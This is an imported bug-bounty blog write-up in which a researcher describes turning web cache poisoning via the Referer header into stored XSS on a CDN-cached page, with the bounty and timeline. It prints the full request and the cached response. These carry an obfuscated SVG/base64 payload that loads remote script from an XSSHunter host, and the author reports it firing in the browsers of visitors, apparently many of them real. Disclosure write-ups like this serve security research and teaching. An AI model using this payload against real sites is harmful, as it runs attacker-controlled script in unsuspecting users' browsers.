---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-29_how-i-made-16500-hacking-cdn-caching-servers-part-1.md
original_filename: 2022-01-29_how-i-made-16500-hacking-cdn-caching-servers-part-1.md
title: How I Made $16,500 Hacking CDN Caching Servers — Part 1
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 54992b838352bff641a95071c09978e9f5e7eaded71de817b076135b1d08532e
text_sha256: 4bea61147ea6897e0ebb8905655f6d0b394174b35a5c8b63eb9574521e0816f6
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# How I Made $16,500 Hacking CDN Caching Servers — Part 1

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-29_how-i-made-16500-hacking-cdn-caching-servers-part-1.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `54992b838352bff641a95071c09978e9f5e7eaded71de817b076135b1d08532e`
- Text SHA256: `4bea61147ea6897e0ebb8905655f6d0b394174b35a5c8b63eb9574521e0816f6`


## Content

---
title: "How I Made $16,500 Hacking CDN Caching Servers — Part 1"
url: "https://bxmbn.medium.com/how-i-made-15-000-by-hacking-caching-servers-part-1-5541712a61c3"
authors: ["Kevin (@bxmbn)"]
bugs: ["Web cache poisoning", "Stored XSS", "Web cache deception"]
bounty: "16,500"
publication_date: "2022-01-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2967
scraped_via: "browseros"
---

# How I Made $16,500 Hacking CDN Caching Servers — Part 1

Top highlight

How I Made $16,500 Hacking CDN Caching Servers — Part 1
@bxmbn
bombon
Follow
2 min read
·
Jan 29, 2022

771

6

Cache Poisoning To Stored XSS

Bounty: $6,300

This was actually my first Cache Poisoning, I initially reported it as a cache Deception issue, because that is all i knew about caching exploits at that time, and the reason how and why this ended up being triaged and awarded as a Cache Poisoning to Stored XSS, was because the Triager, opened my eyes and told me to look for a Self-XSS, so it can be triaged as High or Critical.

I was able to inject Javascript via the Referer Header, but an attacker still needed to send the Poisoned URL to the victim, as the URL needed to be modified by the attacker, so the Cache Server could save it.

After some Google Dorking, I was able to find an URL that was being cached directly without any extensions. This is all i needed :D

I quickly updated the report.

Get bombon’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I provided even more impact by saving my XSSHunter Payload without any “cache busters” (?param=123) then, timed the Cache Server until it refreshes and sent the Request.

Request:
GET /xxxx/xxxx/xxx HTTP/2
Host: Redacted
Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>
...
Response:
HTTP/2 200 Ok
...
Content-Type: text/html; charset=utf-8
X-Cache: HIT
...
<html>
...
<script>
...
"Referer":"?</script>
<svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>
...

I woke up with 35 Notifications from XSSHunter the next day, and to my surprise, 4 of them were fired on a different subdomain.

Press enter or click to view image in full size
Timeline:

Reported → November 7, 2021

Triaged → November 11, 2021

Bounty Awarded → November 17, 2021

Next:

Part 2: A Nice Way To Hide XSS

🔈 🔈 Infosec Writeups is organizing its first-ever virtual conference and networking event. If you’re into Infosec, this is the coolest place to be, with 16 incredible speakers and 10+ hours of power-packed discussion sessions. Check more details and register here.
IWCon2022 - Infosec WriteUps Virtual Conference
Network With World's Best Infosec Professionals. Find How Cybersecurity Pros Achieved Success. Add New Skills to Your…

iwcon.live
